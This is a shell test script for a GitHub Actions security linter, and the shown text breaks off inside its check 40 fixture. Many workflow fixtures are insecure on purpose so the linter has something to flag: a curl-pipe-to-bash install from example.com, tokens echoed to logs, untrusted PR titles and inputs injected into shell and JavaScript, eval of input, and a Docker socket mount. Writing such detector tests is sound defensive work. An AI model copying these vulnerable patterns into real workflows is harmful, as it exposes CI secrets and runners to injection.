#!/usr/bin/env bash
# SPDX-FileCopyrightText: © 2026 Tenstorrent Inc.
# SPDX-License-Identifier: Apache-2.0
# Smoke tests for the GitHub Actions security linter.

set -uo pipefail

passed=0
failed=0
case_index=0

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SECURITY_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
CHECKER="${SECURITY_DIR}/check-actions-security.sh"
PARALLEL_CHECKER="${SECURITY_DIR}/check-actions-security-parallel.sh"
TMP_DIR="$(mktemp -d)"

cleanup() {
    rm -rf "${TMP_DIR}"
}
trap cleanup EXIT

test_pass() {
    printf '%s\n' "  PASS: $1"
    ((passed++)) || true
}

test_fail() {
    printf '%s\n' "  FAIL: $1"
    ((failed++)) || true
}

next_case_file() {
    ((case_index++)) || true
    printf '%s\n' "${TMP_DIR}/case-${case_index}.yaml"
}

assert_detects() {
    local description="$1"
    local checks="$2"
    local expected="$3"
    local file
    local output

    file="$(next_case_file)"
    cat > "${file}"

    output=$(bash "${CHECKER}" --strict -c "${checks}" "${file}" 2>&1 || true)
    if [[ "${output}" == *"${expected}"* ]]; then
        test_pass "${description}"
    else
        test_fail "${description} (expected output to contain '${expected}')"
        printf '%s\n' "${output}"
    fi
}

assert_clean() {
    local description="$1"
    local checks="$2"
    local file
    local output
    local status

    file="$(next_case_file)"
    cat > "${file}"

    output=$(bash "${CHECKER}" --strict -c "${checks}" "${file}" 2>&1)
    status=$?
    if [[ ${status} -eq 0 && "${output}" == *"No security issues found!"* ]]; then
        test_pass "${description}"
    else
        test_fail "${description} (expected clean run)"
        printf '%s\n' "${output}"
    fi
}

assert_parallel_detects() {
    local description="$1"
    local expected="$2"
    local bad_file="${TMP_DIR}/parallel-bad.yaml"
    local good_file="${TMP_DIR}/parallel-good.yaml"
    local output

    cat > "${bad_file}"
    cat > "${good_file}" <<'EOF'
name: good
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
EOF

    output=$(bash "${PARALLEL_CHECKER}" --strict "${bad_file}" "${good_file}" 2>&1 || true)
    if [[ "${output}" == *"${expected}"* ]]; then
        test_pass "${description}"
    else
        test_fail "${description} (expected output to contain '${expected}')"
        printf '%s\n' "${output}"
    fi
}

echo "============================================"
echo "GitHub Actions Security Linter Smoke Tests"
echo "============================================"
echo ""

# --- Check 1: Direct event data interpolation in run blocks ---

assert_detects "check 1 flags event data interpolation in run block" "1" "dangerous event data interpolation" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo title
        run: echo "${{ github.event.pull_request.title }}"
EOF

assert_clean "check 1 accepts event data via env var" "1" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "$PR_TITLE"
EOF

# --- Check 2: eval usage ---

assert_detects "check 2 flags eval statement" "2" "eval" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Run eval
        run: eval "$CMD"
EOF

assert_clean "check 2 accepts case statement alternative" "2" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Run command
        run: |
          case "$CMD" in
            build) make build ;;
            test) make test ;;
          esac
EOF

# --- Check 3: bash -c with direct interpolation ---

assert_detects "check 3 flags bash -c with interpolation" "3" "bash -c" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Run bash
        run: bash -c "echo ${{ inputs.command }}"
EOF

assert_clean "check 3 accepts bash -c with env var" "3" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Run bash
        env:
          CMD: ${{ inputs.command }}
        run: bash -c "echo \"$CMD\""
EOF

# --- Check 4: pull_request_target with checkout ---

assert_detects "check 4 flags pull_request_target with checkout" "4" "pull_request_target with checkout" <<'EOF'
name: test
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Build
        run: make build
EOF

assert_clean "check 4 accepts pull_request with checkout" "4" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Build
        run: make build
EOF

# --- Check 5: Unpinned external action references ---

assert_detects "check 5 flags external actions not pinned to full SHA" "5" "not pinned to a full commit SHA" <<'EOF'
name: test
on: push
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@1234567
EOF

assert_clean "check 5 accepts full SHA action pins" "5" <<'EOF'
name: test
on: push
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

# --- Check 6: secrets: inherit usage (aggregate, threshold 50) ---
# Detect test omitted: check 6 requires 51+ files with 'secrets: inherit' to trigger.

assert_clean "check 6 accepts explicit secret passing" "6" <<'EOF'
name: test
on: push
jobs:
  test:
    uses: ./.github/workflows/build.yaml
    secrets:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
EOF

# --- Check 7: Token exposure in logs ---

assert_detects "check 7 flags token exposure in echo" "7" "token exposure" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Debug
        run: echo "Token is $GITHUB_TOKEN"
EOF

assert_clean "check 7 accepts token in non-echo context" "7" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Use token
        run: curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos
EOF

assert_detects "check 7 flags printf token exposure" "7" "token exposure" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Debug
        run: printf '%s\n' "$GITHUB_TOKEN"
EOF

assert_detects "check 7 flags Python print token exposure" "7" "token exposure" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Debug
        run: python -c "import os; print(os.environ.get('GITHUB_TOKEN', 'none'))"
EOF

assert_detects "check 7 flags Node console.log token exposure" "7" "Potential token exposure" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Debug
        run: node -e "console.log(process.env.GITHUB_TOKEN)"
EOF

# --- Check 8: Overly broad permissions ---

assert_detects "check 8 flags write-all permissions" "8" "write-all" <<'EOF'
name: test
on: push
permissions: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: make build
EOF

assert_clean "check 8 accepts scoped permissions" "8" <<'EOF'
name: test
on: push
permissions:
  contents: read
  pull-requests: write
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: make build
EOF

# --- Check 9: Ref-based injection patterns ---

assert_detects "check 9 flags head.ref interpolation in run block" "9" "head.ref/base.ref interpolation" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo ref
        run: echo "${{ github.event.pull_request.head.ref }}"
EOF

assert_detects "check 9 flags github.head_ref (underscore) in run block" "9" "head.ref/base.ref interpolation" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo ref
        run: echo "${{ github.head_ref }}"
EOF

assert_clean "check 9 accepts head.ref via env var" "9" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo ref
        env:
          HEAD_REF: ${{ github.event.pull_request.head.ref }}
        run: echo "$HEAD_REF"
EOF

# --- Check 10: curl | bash patterns ---

assert_detects "check 10 flags curl pipe to bash" "10" "curl | bash" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Install
        run: curl -sSL https://example.com/install.sh | bash
EOF

assert_clean "check 10 accepts download then verify pattern" "10" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Install
        run: |
          curl -sSL -o install.sh https://example.com/install.sh
          sha256sum -c <<< "expected_hash  install.sh"
          bash install.sh
EOF

# --- Check 11: inputs/outputs interpolation in run blocks ---

assert_detects "check 11 flags inputs interpolation in run block" "11" "inputs" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      name:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Greet
        run: echo "Hello ${{ inputs.name }}"
EOF

assert_clean "check 11 accepts inputs via env var" "11" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      name:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Greet
        env:
          NAME: ${{ inputs.name }}
        run: echo "Hello $NAME"
EOF

# --- Check 12: Deprecated ::set-output and ::save-state ---

assert_detects "check 12 flags deprecated set-output command" "12" "deprecated" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set output
        run: echo "::set-output name=result::$VALUE"
EOF

assert_clean "check 12 accepts GITHUB_OUTPUT file" "12" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set output
        run: echo "result=$VALUE" >> "$GITHUB_OUTPUT"
EOF

# --- Check 13: ACTIONS_ALLOW_UNSECURE_COMMANDS ---

assert_detects "check 13 flags ACTIONS_ALLOW_UNSECURE_COMMANDS" "13" "ACTIONS_ALLOW_UNSECURE_COMMANDS" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    steps:
      - name: Set env
        run: echo "::set-env name=PATH::$NEW_PATH"
EOF

assert_clean "check 13 accepts GITHUB_ENV file usage" "13" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set env
        run: echo "PATH=$NEW_PATH" >> "$GITHUB_ENV"
EOF

# --- Check 14: toJSON() in run blocks ---

assert_detects "check 14 flags toJSON in run block" "14" "toJSON()" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config: [a, b]
    steps:
      - name: Show config
        run: |
          data='${{ toJSON(matrix.config) }}'
          echo "$data" | jq .
EOF

assert_clean "check 14 accepts toJSON via env var" "14" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config: [a, b]
    steps:
      - name: Show config
        env:
          CONFIG_JSON: ${{ toJSON(matrix.config) }}
        run: echo "$CONFIG_JSON" | jq .
EOF

# --- Check 15: Cross-repo reusable workflow mutable refs ---

assert_detects "check 15 flags reusable workflows on mutable refs" "15" "mutable ref instead of commit SHA" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  reuse:
    uses: octo-org/example/.github/workflows/build.yaml@release-2026.03
EOF

# --- Check 16: Additional attacker-controlled event fields ---

assert_detects "check 16 flags attacker-controlled event fields in run block" "16" "attacker-controlled github.event field" <<'EOF'
name: test
on: discussion
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo title
        run: echo "${{ github.event.discussion.title }}"
EOF

assert_clean "check 16 accepts attacker-controlled fields via env var" "16" <<'EOF'
name: test
on: discussion
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Echo title
        env:
          TITLE: ${{ github.event.discussion.title }}
        run: echo "$TITLE"
EOF

# --- Check 17: actions/github-script with expression interpolation ---

assert_detects "check 17 flags github-script with event interpolation" "17" "JavaScript injection" <<'EOF'
name: test
on: issues
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const title = "${{ github.event.issue.title }}";
            console.log(title);
EOF

assert_clean "check 17 accepts github-script with process.env" "17" <<'EOF'
name: test
on: issues
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        with:
          script: |
            const title = process.env.ISSUE_TITLE;
            console.log(title);
EOF

# --- Check 18: secrets.* interpolation in run blocks ---

assert_detects "check 18 flags secrets interpolation in run block" "18" "secrets" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set remote
        run: git remote set-url origin https://${{ secrets.MY_TOKEN }}@github.com/org/repo.git
EOF

assert_clean "check 18 accepts secrets via env var" "18" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set remote
        env:
          MY_TOKEN: ${{ secrets.MY_TOKEN }}
        run: git remote set-url origin "https://${MY_TOKEN}@github.com/org/repo.git"
EOF

# --- Check 19: matrix.* interpolation in run blocks ---

assert_detects "check 19 flags matrix interpolation in run block" "19" "matrix" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        os: [ubuntu, macos]
    steps:
      - name: Show OS
        run: echo "Testing on ${{ matrix.os }}"
EOF

assert_clean "check 19 accepts matrix via env var" "19" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        os: [ubuntu, macos]
    steps:
      - name: Show OS
        env:
          MATRIX_OS: ${{ matrix.os }}
        run: echo "Testing on $MATRIX_OS"
EOF

# --- Check 20: github.repository/github.event_name in run blocks ---

assert_detects "check 20 flags github.repository in run block" "20" "github.repository" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Show repo
        run: gh pr view 123 --repo "${{ github.repository }}"
EOF

assert_clean "check 20 accepts github.repository via env var" "20" <<'EOF'
name: test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Show repo
        env:
          REPO: ${{ github.repository }}
        run: gh pr view 123 --repo "$REPO"
EOF

# --- Check 21: pull_request_target privilege boundary issues ---

assert_detects "check 21 flags pull_request_target head checkout" "21" "checks out the PR head ref/repository" <<'EOF'
name: test
on:
  pull_request_target:
jobs:
  privileged:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: ./.github/actions/local-action
EOF

assert_detects "check 22 flags privileged workflow_run artifact use" "22" "downloads or references upstream run artifacts" <<'EOF'
name: test
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
permissions:
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: gh run download "${{ github.event.workflow_run.id }}"
EOF

assert_detects "check 23 flags self-hosted runners on pull_request" "23" "self-hosted runner" <<'EOF'
name: test
on:
  pull_request:
jobs:
  test:
    runs-on: [self-hosted, linux]
    steps:
      - run: echo safe
EOF

assert_detects "check 24 flags write permissions on untrusted triggers" "24" "write-capable token scopes" <<'EOF'
name: test
on:
  issue_comment:
permissions:
  contents: write
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
EOF

assert_detects "check 24 flags write permissions on scalar pull_request trigger" "24" "write-capable token scopes" <<'EOF'
name: test
on: pull_request
permissions:
  contents: write
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
EOF

assert_detects "check 24 flags write permissions on flow-style pull_request trigger" "24" "write-capable token scopes" <<'EOF'
name: test
on: [pull_request]
permissions:
  contents: write
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
EOF

assert_detects "check 25 flags mutable container image references" "25" "without immutable @sha256 digests" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/example/build-env:latest
    steps:
      - uses: docker://alpine:3.20
EOF

assert_clean "check 25 accepts digest-pinned container images" "25" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/example/build-env@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    steps:
      - uses: docker://alpine@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
EOF

assert_detects "check 25 flags container image from workflow input" "25" "without immutable @sha256 digests" <<'EOF'
name: test
on: workflow_dispatch
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    container:
      image: ${{ inputs.image }}
    steps:
      - run: echo build
EOF

assert_parallel_detects "parallel wrapper preserves new check output" "self-hosted runner" <<'EOF'
name: bad
on:
  pull_request:
jobs:
  test:
    runs-on: [self-hosted, linux]
    steps:
      - run: echo hi
EOF

assert_detects "check 26 flags fromJSON with attacker-controlled input" "26" "fromJSON() used with potentially attacker-controlled input" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ${{ fromJSON(inputs.runner-label) }}
    steps:
      - run: echo hi
EOF

assert_clean "check 26 accepts fromJSON with safe context" "26" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ${{ fromJSON(vars.RUNNER_LABELS) }}
    steps:
      - run: echo hi
EOF

assert_detects "check 26 flags fromJSON with inputs on single-line on: workflow_dispatch" "26" "fromJSON() used with potentially attacker-controlled input" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ${{ fromJSON(inputs.runner-label) }}
    steps:
      - run: echo hi
EOF

assert_detects "check 27 flags dynamic expressions in uses:" "27" "Uses statement contains expression interpolation" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    uses: ./.github/workflows/${{ inputs.workflow }}.yaml
EOF

assert_clean "check 27 accepts static uses: references" "27" <<'EOF'
name: test
on: push
jobs:
  build:
    uses: ./.github/workflows/build.yaml
EOF

assert_detects "check 28 flags cache keys with attacker-controlled input" "28" "Cache key/restore-keys/path contains potentially attacker-controlled input" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          key: ${{ inputs.cache-key }}-deps
EOF

assert_detects "check 28 flags cache restore-keys with attacker-controlled input" "28" "Cache key/restore-keys/path contains potentially attacker-controlled input" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/cache@0c45773b6237508fd0a00a0b098d13079a9c308b
        with:
          path: node_modules
          key: safe-${{ github.sha }}
          restore-keys: ${{ github.event.pull_request.title }}
EOF

assert_detects "check 28 flags cache path with attacker-controlled input" "28" "Cache key/restore-keys/path contains potentially attacker-controlled input" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/cache@0c45773b6237508fd0a00a0b098d13079a9c308b
        with:
          path: ${{ github.event.pull_request.title }}
          key: static-key-${{ github.sha }}
EOF

assert_clean "check 28 accepts cache keys with safe context" "28" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          key: ${{ github.sha }}-deps
EOF

assert_detects "check 29 flags artifact paths with expressions" "29" "Artifact path/name/pattern contains expression interpolation" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          path: ${{ inputs.artifact-path }}
EOF

assert_detects "check 29 flags artifact names with expressions" "29" "Artifact path/name/pattern contains expression interpolation" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/download-artifact@ea165f8d65b6e75b540449ecdda27a11b875b458
        with:
          name: ${{ github.event.pull_request.title }}
EOF

assert_clean "check 29 accepts hardcoded artifact paths" "29" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          path: ./build/
EOF

assert_detects "check 29 flags artifact paths with single-line on: workflow_dispatch" "29" "Artifact path/name/pattern contains expression interpolation" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/upload-artifact@v4
        with:
          path: ${{ inputs.artifact-path }}
EOF

assert_detects "check 30 flags curl with expression URLs" "30" "curl/wget command contains expression interpolation" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL "${{ inputs.download-url }}" -o file.tar.gz
EOF

assert_clean "check 30 accepts curl with hardcoded URLs" "30" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL "https://example.com/file.tar.gz" -o file.tar.gz
EOF

assert_detects "check 31 flags container volume expressions" "31" "Container volume mount contains expression interpolation" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: ubuntu:latest
      volumes:
        - ${{ inputs.mount-path }}:/workspace
    steps:
      - run: echo hi
EOF

assert_clean "check 31 accepts hardcoded container volumes" "31" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: ubuntu:latest
      volumes:
        - /workspace:/workspace
    steps:
      - run: echo hi
EOF

assert_detects "check 31 flags Docker socket container volume" "31" "host-sensitive path" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    container:
      image: ubuntu@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      volumes:
        - /var/run/docker.sock:/var/run/docker.sock
    steps:
      - run: echo hi
EOF

# --- Check 32: Expression interpolation in GITHUB_ENV/PATH/OUTPUT/STATE writes ---

assert_detects "check 32 flags expression in GITHUB_ENV write" "32" "GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set env
        run: echo "BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
EOF

assert_detects "check 32 flags expression in GITHUB_PATH write" "32" "GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      extra-path:
        required: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set path
        run: echo "${{ inputs.extra-path }}" >> "$GITHUB_PATH"
EOF

assert_detects "check 32 flags expression in GITHUB_STATE write" "32" "GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set state
        run: echo "flag=${{ github.event.pull_request.title }}" >> "$GITHUB_STATE"
EOF

assert_clean "check 32 accepts shell variable in GITHUB_ENV write" "32" <<'EOF'
name: test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Set env
        env:
          BRANCH: ${{ github.head_ref }}
        run: echo "BRANCH=$BRANCH" >> "$GITHUB_ENV"
EOF

# --- Check 33: Missing explicit permissions key (aggregate) ---

assert_detects "check 33 flags workflow missing permissions key" "33" "without an explicit top-level" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: make build
EOF

assert_clean "check 33 accepts workflow with permissions key" "33" <<'EOF'
name: test
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: make build
EOF

# --- Check 34: Concurrency group with attacker-controlled data ---

assert_detects "check 34 flags concurrency with head_ref" "34" "Concurrency group contains attacker-controlled expression" <<'EOF'
name: test
on: pull_request
concurrency:
  group: deploy-${{ github.head_ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: echo hello
EOF

assert_detects "check 34 flags concurrency with inputs" "34" "Concurrency group contains attacker-controlled expression" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      env-name:
        required: true
concurrency:
  group: deploy-${{ inputs.env-name }}
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: echo hello
EOF

assert_clean "check 34 accepts concurrency with safe context" "34" <<'EOF'
name: test
on: push
concurrency:
  group: ci-${{ github.sha }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: echo hello
EOF

# --- Check 35: issue_comment trigger without authorization gate ---

assert_detects "check 35 flags issue_comment without auth gate" "35" "no author_association" <<'EOF'
name: test
on: issue_comment
jobs:
  deploy:
    if: startsWith(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: echo deploying
EOF

assert_clean "check 35 accepts issue_comment with author_association" "35" <<'EOF'
name: test
on: issue_comment
jobs:
  deploy:
    if: |
      startsWith(github.event.comment.body, '/deploy') &&
      github.event.comment.author_association == 'MEMBER'
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: echo deploying
EOF

assert_detects "check 35 flags discussion_comment without auth gate" "35" "comment trigger has no author_association" <<'EOF'
name: test
on: discussion_comment
permissions: read-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: echo triggered
EOF

# --- Check 36: working-directory with attacker-controlled expressions ---

assert_detects "check 36 flags working-directory with inputs expression" "36" "working-directory contains attacker-controlled expression" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      build-dir:
        required: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Build
        run: make build
        working-directory: ${{ inputs.build-dir }}
EOF

assert_clean "check 36 accepts working-directory with github.workspace" "36" <<'EOF'
name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Build
        run: make build
        working-directory: ${{ github.workspace }}/src
EOF

assert_detects "check 36 flags working-directory with inputs on single-line on: workflow_dispatch" "36" "working-directory contains attacker-controlled expression" <<'EOF'
name: test
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: Build
        run: make build
        working-directory: ${{ inputs.build-dir }}
EOF

# --- Check 37: github-script with non-event attacker-controlled interpolation ---

assert_detects "check 37 flags github-script with inputs interpolation" "37" "JavaScript injection risk" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      user_script:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          script: |
            const body = "${{ inputs.user_script }}";
            console.log(body);
EOF

assert_clean "check 37 accepts github-script with process.env for inputs" "37" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      user_script:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        env:
          USER_SCRIPT: ${{ inputs.user_script }}
        with:
          script: |
            const body = process.env.USER_SCRIPT;
            console.log(body);
EOF

# --- Check 38: github-script dynamic code execution primitives ---

assert_detects "check 38 flags github-script dynamic code execution" "38" "dynamic code execution" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          script: |
            const dynamic = core.getInput('payload');
            return new Function(dynamic)();
EOF

assert_detects "check 38 flags github-script eval with process.env" "38" "dynamic code execution" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        env:
          USER_SCRIPT: ${{ inputs.payload }}
        with:
          script: |
            eval(process.env.USER_SCRIPT)
EOF

assert_clean "check 38 accepts github-script treating input as data" "38" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          script: |
            const payload = core.getInput('payload');
            console.log(payload);
EOF

# --- Check 39: Inline interpreter eval/exec patterns in run blocks ---

assert_detects "check 39 flags node -e eval with env data" "39" "Inline interpreter command uses eval/exec-style dynamic code execution" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          USER_SCRIPT: ${{ inputs.payload }}
        run: node -e "eval(process.env.USER_SCRIPT)"
EOF

assert_clean "check 39 accepts inline interpreter without eval" "39" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - env:
          USER_SCRIPT: ${{ inputs.payload }}
        run: node -e "console.log(process.env.USER_SCRIPT)"
EOF

# --- Check 40: github-script command execution APIs ---

assert_detects "check 40 flags github-script child_process execution with input" "40" "command injection risk" <<'EOF'
name: test
on:
  workflow_dispatch:
    inputs:
      payload:
        required: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          script: |
